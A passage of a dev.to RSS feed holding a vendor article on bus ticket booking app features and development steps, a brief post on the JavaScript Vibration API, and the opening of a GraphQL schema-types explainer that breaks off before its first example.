      <link>https://dev.to/ascendixtech/how-to-build-an-online-bus-ticket-booking-and-reservation-system-key-features-and-step-by-step-development-process-5cmi</link>
      <guid>https://dev.to/ascendixtech/how-to-build-an-online-bus-ticket-booking-and-reservation-system-key-features-and-step-by-step-development-process-5cmi</guid>
      <description>&lt;p&gt;&lt;em&gt;The article was originally published at &lt;a href="https://ascendixtech.com/online-bus-ticket-booking-reservation-system-development/"&gt;Ascendix Tech's Blog&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#musthave-features-of-a-bus-ticket-booking-app"&gt;
  &lt;/a&gt;
  Must-have features of a bus ticket booking app
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#key-functionality-for-customers"&gt;
  &lt;/a&gt;
  Key functionality for customers
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Easy Registration &amp;amp; Social Login&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The first and foremost functionality for most modern applications is also crucial for your bus ticket booking and reservation system.  &lt;/p&gt;

&lt;p&gt;You should constantly analyze users’ behavior, their routes and schedules, and other aspects to provide the best customer experience and keep the churn rate as low as possible. &lt;/p&gt;

&lt;p&gt;What’s more, users often require some help and feedback from your customer support service. It means that you need to know each user’s history of bookings, payment options, and other personal data to offer instant and relevant answers and solutions to customers. &lt;/p&gt;

&lt;p&gt;The mentioned above things become possible after implementing an easy-to-use sign-up/sign-in feature with social login functionality.  &lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.smartinsights.com/social-media-marketing/social-media-platforms/social-sign-on-the-implications-for-ecommerce-sites/"&gt;Smart Insights Report&lt;/a&gt; states that the social log-in functionality boosts the click-to-registration rate up to 50%. &lt;/p&gt;

&lt;p&gt;Below you can see designed mockups of the registration/login form with a social login feature created for Flibco by Ascendix Tech. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--tqpvmwgP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wswlttnnftrsqpzai1iv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--tqpvmwgP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wswlttnnftrsqpzai1iv.png" alt="Flibco registration and social login functionality | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Destination, date/time, passengers&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Once created a personal profile, users usually proceed to booking a desired bus ticket. This stage is must-have for your bus ticket booking software and should include the following details: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Departure and arrival points&lt;/li&gt;
&lt;li&gt;Date time for their outward and return (if any) journeys &lt;/li&gt;
&lt;li&gt;Number of travelers (with infants, if any) &lt;/li&gt;
&lt;li&gt;The Search button. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Below you can see mobile designed mockups of the main screens we created for Flibco.com. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--i02LVtL0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h6456rvhcogtqmyn8ueo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i02LVtL0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h6456rvhcogtqmyn8ueo.png" alt="Departure/arrival and route screen of Flibco | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trip choice and tour details&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After filling in the required data like departure/arrival spots, date, time, and the number of passengers, you need to provide customers with relevant trips that meet their criteria. At Ascendix Tech, we suggest adding the following aspects to this stage of your online bus ticket booking and reservation system: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Trip bus provider &lt;/li&gt;
&lt;li&gt;Departure/arrival time &lt;/li&gt;
&lt;li&gt;Journey time &lt;/li&gt;
&lt;li&gt;Trip price &lt;/li&gt;
&lt;li&gt;Duration of transfers (if any). &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What’s more, provide users with an opportunity to check trip details by clicking on a specific journey option. We recommend showing an exact number of bus stops, a transfer timing, and the general trip duration. &lt;/p&gt;

&lt;p&gt;Below we share the designed mobile mockups of the trip choice and tour details steps for Flibco.com. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--xNWZjZTl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jkoxgn0l1azeqpwvfffh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xNWZjZTl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jkoxgn0l1azeqpwvfffh.png" alt="Tour choice and details for Flibco | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Passenger’s information&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Once selected the preferred trip option, navigate users to the stage of entering the passengers’ details: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First and Last name&lt;/li&gt;
&lt;li&gt;Phone number with the country’s code &lt;/li&gt;
&lt;li&gt;Email (optional). &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This stage is crucial to identify passengers and assign specific bus seats to them. This screen shouldn’t include multiple fields in order to keep your online bus ticket booking and reservation system flow as simple and user-oriented as possible. &lt;/p&gt;

&lt;p&gt;Below is a designed mobile mockup for the passenger identification stage created for Flibco.com. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qhAGuu85--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0r91jbatl8cu3sct8oyj.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qhAGuu85--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0r91jbatl8cu3sct8oyj.png" alt="Passengers’ information for Flibco | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Confirmation and payment&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;One of the final must-have features for your online bus ticket software is the confirmation and payment stage, the so-called checkout process. Here we suggest offering your customers multiple payment gateways to boost the conversion rate and provide as much convenience as possible. &lt;/p&gt;

&lt;p&gt;The PR Newswire study states that &lt;a href="https://www.prnewswire.com/news-releases/study-small-businesses-offering-multiple-payment-options-increase-revenue-by-nearly-30-percent-301031597.html"&gt;small businesses that provide different payment methods increase revenue by over 30% in average&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;According to &lt;a href="https://www.entrepreneur.com/article/286006"&gt;Entrepreneur.com&lt;/a&gt;, Stripe, PayPal, Payoneer, Apple/Google Pay, and Amazon Payments are among the leading payment options for users. &lt;/p&gt;

&lt;p&gt;What’s more, you can also implement the option to pay via cash as &lt;a href="https://www.statista.com/statistics/508988/preferred-payment-methods-of-online-shoppers-worldwide/"&gt;more than 23% of users still opt for cash on delivery&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;Ultimately, we recommend providing users with an ability to download payment invoices which stand for a digital copy of their bills. &lt;/p&gt;

&lt;p&gt;Right here is a designed mobile mockup for the passenger confirmation and payment experience which was created for Flibco.com. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--piitakk---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s4abqyztfrecfqp1leh0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--piitakk---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s4abqyztfrecfqp1leh0.png" alt="Сonfirmation and payment processes for Flibco | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#key-features-for-business"&gt;
  &lt;/a&gt;
  Key features for business
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Control Hub &amp;amp; Dashboard&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dashboard functionality allows you to process, monitor, and analyze any aspects of your online bus ticket booking and reservation system with a single-click ease. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Routes &amp;amp; Schedules&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Your ticket reservation software should include well-thought-out routes and schedules that lead to a win-win strategy for both customers and your company in terms of logistics. &lt;/p&gt;

&lt;p&gt;For this reason, we recommend building advanced features dedicated to the creation and management of routes, pickups, drop points, schedules, and other bus tour details. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Inventory management&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With the help of inventory management, you can keep a stock of the in-service buses, their types and models, seat layouts, tariff rules, and so on. &lt;/p&gt;

&lt;p&gt;This information is of utmost importance to analyze your capabilities and verify whether your supply fully cover customers’ demands. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qJy3Wfhu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkm0ct9yp6ldi7sq9bei.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qJy3Wfhu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkm0ct9yp6ldi7sq9bei.png" alt="Benefits of Inventory Management for Business | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GPS Bus Tracking&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This functionality allows you to reduce operational costs dramatically by analyzing such aspects as fuel consumption, idle and bus misuse time. How does it work? &lt;/p&gt;

&lt;p&gt;You develop a tracking feature and equip your buses with GPS trackers to monitor their location, driving direction, and fuel consumption rate in real-time. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FlEKAXLl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1d3mlfhg8roqx9bx0pjp.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FlEKAXLl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1d3mlfhg8roqx9bx0pjp.png" alt="GPS Bus Tracking Benefits for Your Business | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Bus driver management&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Driver management allows you to provide as much real-time transparency as possible by alerting or dispatching managers of any trouble emerged. &lt;/p&gt;

&lt;p&gt;Besides, it enables you to define drivers’ risky behavior immediately through managers that can contact bus drivers quickly if any situation happens. &lt;/p&gt;

&lt;p&gt;Bus driver management software also allows you to enhance fleet efficiency by times. Managers can inform drivers instantly in case of traffic, road, or weather conditions’ changes that may affect travel time and passengers’ safety. &lt;/p&gt;

&lt;p&gt;What’s more, you can create a built-in predictive maintenance system which helps you to keep all bus fleet units repaired and free of breakdowns. So, you can gradually cut down the idle time of drivers as they no longer need to stay inactive waiting for a vehicle repair. &lt;/p&gt;

&lt;p&gt;Ultimately, bus driver management software enables you to automate the rewards program that enhances driver retention rate. It works the following way: drivers get safety scores for high performance which can be summed up in the end of a quarter to reward them and keep from leaving your company. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2OmozCJ---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iak3sp912ln8ssly472k.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2OmozCJ---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iak3sp912ln8ssly472k.png" alt="Bus Driver Management Benefits for Your Business | Ascendix Tech"&gt;&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#bus-ticket-booking-app-development-process"&gt;
  &lt;/a&gt;
  Bus ticket booking app development process
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#1-create-and-validate-your-project-idea"&gt;
  &lt;/a&gt;
  1. Create and validate your project idea
&lt;/h3&gt;

&lt;p&gt;First, you need to come up with a project idea of your bus ticket booking software and define its core goal and value for customers. Analyze top market competitors, take their best features and eliminate top mistakes and bugs. &lt;/p&gt;

&lt;p&gt;Then, form a general product vision and validate your project idea through the following options: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Ask your friends, colleagues, and relatives &lt;/li&gt;
&lt;li&gt;Use social platforms to conduct surveys and interview users &lt;/li&gt;
&lt;li&gt;Set up focus groups. &lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#2-choose-a-development-option"&gt;
  &lt;/a&gt;
  2. Choose a development option
&lt;/h3&gt;

&lt;p&gt;Once formed a detailed strategy and collected project requirements, you can proceed to the development process of your software for ticket sale in bus.  &lt;/p&gt;

&lt;p&gt;Here you can choose from the following 4 options: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hire freelancers
&lt;/li&gt;
&lt;li&gt;Find a technical partner/CTO &lt;/li&gt;
&lt;li&gt;Outsource to an IT agency &lt;/li&gt;
&lt;li&gt;Build the bus ticket booking and reservation system yourself. &lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#3-perform-a-discovery-phase"&gt;
  &lt;/a&gt;
  3. Perform a discovery phase
&lt;/h3&gt;

&lt;p&gt;A project discovery phase will help you generate a detailed project development plan with a strict timeline, exact deadlines, and specific milestones. The process inlcudes engagement of such specialists as Business Analysts, Solution Architects, UI/UX designers and others depending on your project specific. &lt;/p&gt;

&lt;p&gt;As a result, you should get a detailed System Requirements Specification (SRS) document that includes project goals, milestones, sprints, deadlines, and final development costs. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-develop-the-core-mvp-functionality"&gt;
  &lt;/a&gt;
  4. Develop the core MVP functionality
&lt;/h3&gt;

&lt;p&gt;Minimum Viable Product (MVP) is a great strategy to cut down expenses, release quick, and gather useful feedback from your customers and enhance your product greatly.  &lt;/p&gt;

&lt;p&gt;Here is the list of the must-have MVP features for your bus ticket booking app: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Easy Registration &amp;amp; Social Login &lt;/li&gt;
&lt;li&gt;Destination, date/time, passengers &lt;/li&gt;
&lt;li&gt;Trip choice and tour details &lt;/li&gt;
&lt;li&gt;Passenger’s information &lt;/li&gt;
&lt;li&gt;Confirmation and payment. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Fq9ckAsN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1n5u3kpa42aac8twi1yo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Fq9ckAsN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1n5u3kpa42aac8twi1yo.png" alt="Must-Have Bus Booking Software Features for Customers"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now let’s check the core functionality for you as a business owner: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Control Hub &amp;amp; Dashboard &lt;/li&gt;
&lt;li&gt;Routes &amp;amp; Schedules &lt;/li&gt;
&lt;li&gt;Inventory management &lt;/li&gt;
&lt;li&gt;GPS Bus Tracking &lt;/li&gt;
&lt;li&gt;Bus driver management. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zhYsZLG1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f16u41yq5k15miwdu0s2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zhYsZLG1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f16u41yq5k15miwdu0s2.png" alt="Must-Have Bus Booking Software Features for Business"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-release-and-collect-feedback"&gt;
  &lt;/a&gt;
  5. Release and collect feedback
&lt;/h3&gt;

&lt;p&gt;After finishing the development process of your bus ticket booking software, you need to release its MVP version and make it public. &lt;/p&gt;

&lt;p&gt;We recommend preparing and distributing high-quality press releases through such well-known platforms as: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;PR Fire &lt;/li&gt;
&lt;li&gt;PR Web &lt;/li&gt;
&lt;li&gt;Presswire &lt;/li&gt;
&lt;li&gt;LinkedIn, Facebook, Twitter &lt;/li&gt;
&lt;li&gt;YCombinator, Reddit, IndieHackers. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will enable you to attract much attention and acquire first customers, collect their feedback, and improve your bus ticket booking and reservation system on. &lt;/p&gt;

&lt;p&gt;The enhancement part should be your top priority as most likely users will find your product not that ideal (which is completely normal) which means that you should focus on improving it by adding/removing/modifying the features. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#6-scale-and-support"&gt;
  &lt;/a&gt;
  6. Scale and support
&lt;/h3&gt;

&lt;p&gt;Process the feedback you got from real users and customers after releasing your product and making it public. Implement new features, solve security issues (if any), change the existing functionality, and so on. &lt;/p&gt;

&lt;p&gt;The next step is to scale your bus ticket booking app offering advanced features and more servers to boost the user experience of your customers around the world. &lt;/p&gt;

&lt;p&gt;Also, you should constantly maintain and support your product to keep it error-free. Most digital products have bugs and this is normal but your task is to minimize its quantity as much as possible. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#our-expertise-in-bus-ticket-booking-app-development"&gt;
  &lt;/a&gt;
  Our Expertise in Bus Ticket Booking App Development
&lt;/h2&gt;

&lt;p&gt;At Ascendix Tech, we have built multiple solutions dedicated to bus ticket booking software and now we want to share one of them.  &lt;/p&gt;

&lt;p&gt;So, here is the case of online bus ticket app development for Flibco.com - a leading private airport shuttle service provider with a passenger turnover of 1.9 million/year in main Western European countries with headquarters in Luxembourg. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What challenges we had to solve?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Migrate an old system to a new modern solution &lt;/li&gt;
&lt;li&gt;Develop powerful route generation tool &lt;/li&gt;
&lt;li&gt;Build advanced security management &lt;/li&gt;
&lt;li&gt;Conduct cloud migration to an advanced online ticket reservation software &lt;/li&gt;
&lt;li&gt;Integrate multi-payment functionality &lt;/li&gt;
&lt;li&gt;Create front-rank performance analytics tools. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;What solutions have we built?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Shuttle booking management &lt;/li&gt;
&lt;li&gt;Ticket management &lt;/li&gt;
&lt;li&gt;Integration with TomTom services &lt;/li&gt;
&lt;li&gt;Google maps integration &lt;/li&gt;
&lt;li&gt;Security management &lt;/li&gt;
&lt;li&gt;Performance analytics &lt;/li&gt;
&lt;li&gt;Multi-payment integration &lt;/li&gt;
&lt;li&gt;Intuitive sign-up process &lt;/li&gt;
&lt;li&gt;Drupal CMS integration. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you want to learn more details about the bus ticket software development for Flibco.com, keep &lt;a href="https://ascendixtech.com/cases/custom-cross-platform-app-development-flibco/"&gt;reading the full case study below&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://ascendixtech.com/cases/custom-cross-platform-app-development-flibco/"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vWMtbLUD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9d6qkbqfjsxxd2kw2n9f.png" alt="Custom bus ticket booking app development case study for Flibco | Ascendix Tech"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To draw the line, we have completed lots of tasks dedicated to bus ticket software development, system integration, cloud migration, DevOps services, etc. &lt;/p&gt;

&lt;p&gt;To prove our words, here is what Alex Tregubov, Product Owner at Flibco.com, said: &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;In early 2019 we were in need to outsource the development of a mobile application to an external bus ticket booking app development company. We were blessed to find Ascendix! A number of other initiatives followed after the online bus ticket app delivery, including a unique system to manage our Door2Gate product and a complete overall revival of our IT infrastructure. Our partners at Ascendix have been phenomenal all the way, showing an exceptional level of efficiency, transparency, expertise, and quality. It’s no doubt that all of our future initiatives are with Ascendix Technologies.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#bottom-line"&gt;
  &lt;/a&gt;
  Bottom Line
&lt;/h2&gt;

&lt;p&gt;The online bus ticket booking and reservation system development may seem to be a tough and long process. However, a long way to Fuji starts with the first step so start doing and the result won't be long in coming.&lt;/p&gt;

&lt;p&gt;If you want to learn more details about the step-by-step guide on building a bus ticket reservation software, then keep reading our full blog post &lt;strong&gt;&lt;a href="https://ascendixtech.com/online-bus-ticket-booking-reservation-system-development/"&gt;How to Build an Online Bus Ticket Booking and Reservation System: Key Features and Benefits for Business&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

</description>
      <category>tutorial</category>
      <category>showdev</category>
      <category>startup</category>
      <category>development</category>
    </item>
    <item>
      <title>Vibrate MobileDevice With
Javascript</title>
      <author>Innocent Coder</author>
      <pubDate>Thu, 24 Jun 2021 10:27:55 +0000</pubDate>
      <link>https://dev.to/innocentcoder/vibrate-mobiledevice-with-javascript-245f</link>
      <guid>https://dev.to/innocentcoder/vibrate-mobiledevice-with-javascript-245f</guid>
      <description>&lt;p&gt;Hello So Today We LearnHow To How Use Vibrate In Javascript&lt;/p&gt;

&lt;p&gt;this post repost from:- &lt;a href="https://the-dev-community.blogspot.com/vibrate-mobiledevice-with-javascript"&gt;https://the-dev-community.blogspot.com/vibrate-mobiledevice-with-javascript&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#html"&gt;
  &lt;/a&gt;
  Html
&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JosRjYzy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a8agk7s0leiatkourjl0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JosRjYzy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a8agk7s0leiatkourjl0.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#js"&gt;
  &lt;/a&gt;
  js
&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HJu86SgF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uvedeucb3tnf5ybxd826.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HJu86SgF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uvedeucb3tnf5ybxd826.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;i make a demo site so chack how mobile vibrat or not&lt;/p&gt;

&lt;p&gt;&lt;a href="https://vibrate-as.netlify.app"&gt;https://vibrate-as.netlify.app&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:-&lt;/strong&gt; visit my youtube channel for frontend tutorials&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;subscribe to my youtube channel :-&lt;/strong&gt; &lt;a href="https://www.youtube.com/channel/UCR64vQptythbJ1SmI-ub0Rg"&gt;https://www.youtube.com/channel/UCR64vQptythbJ1SmI-ub0Rg&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resent post :-&lt;/strong&gt; &lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag__link"&gt;
  &lt;a href="/innocentcoder" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RGJ5NE5F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--ICZsIDfS--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/620705/764eb964-ecd2-4875-90c2-142dfc2f639c.jpg" alt="innocentcoder"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/innocentcoder/top-7-popular-npm-packages-45n7" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Top 7 Popular Npm Packages&lt;/h2&gt;
      &lt;h3&gt;Innocent Coder ・ Jun 23 ・ 1 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#npm&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#node&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#programming&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


</description>
      <category>javascript</category>
      <category>webdev</category>
      <category>discuss</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>GraphQL's Schema Definition Language (SDL) types</title>
      <author>Menard Maranan</author>
      <pubDate>Thu, 24 Jun 2021 09:49:13 +0000</pubDate>
      <link>https://dev.to/menard_codes/graphql-s-schema-definition-language-sdl-types-40mn</link>
      <guid>https://dev.to/menard_codes/graphql-s-schema-definition-language-sdl-types-40mn</guid>
      <description>&lt;p&gt;The Schema Definition Language of GraphQL is used to define the schema of data for a GraphQL based API.&lt;/p&gt;

&lt;p&gt;Being platform/language agnostic, GraphQL uses it's own language to define and query a GraphQL API, and when you're building the backend, you'll define your schema with SDL.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#supported-types"&gt;
  &lt;/a&gt;
  Supported Types
&lt;/h2&gt;

&lt;p&gt;Here's a quick round down of this list:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Scalar Types&lt;/li&gt;
&lt;li&gt;Object Types&lt;/li&gt;
&lt;li&gt;Query Type&lt;/li&gt;
&lt;li&gt;Mutation Type&lt;/li&gt;
&lt;li&gt;Input Types&lt;/li&gt;
&lt;li&gt;Enum Types&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So let's start with the simplest type, the Scalars.&lt;/p&gt;

&lt;p&gt;1.&lt;strong&gt;Scalar Types&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Scalar types are like the Primitive types in your favorite language (i.e. strings, booleans, floats, etc.).&lt;/p&gt;

&lt;p&gt;In GraphQL, we also have these types which we call Scalars:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Int&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Float&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;String&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Boolean&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;ID&lt;/strong&gt; - &lt;em&gt;this one serializes to string, so it's safe to say that id's are string&lt;/em&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2.&lt;strong&gt;Object Types&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I like to think of it as a JavaScript object (but defined as it's own type) or a class, as in the class in OOP (Object Oriented Programming).&lt;/p&gt;

&lt;p&gt;It holds a key-value pair, where keys are called as fields, and each field defines the types of data they return, which can be either a Scalar or another Object (to emphasize relationships among nodes).&lt;/p&gt;

&lt;p&gt;Here's an example of an object in GraphQL:&lt;/p&gt;

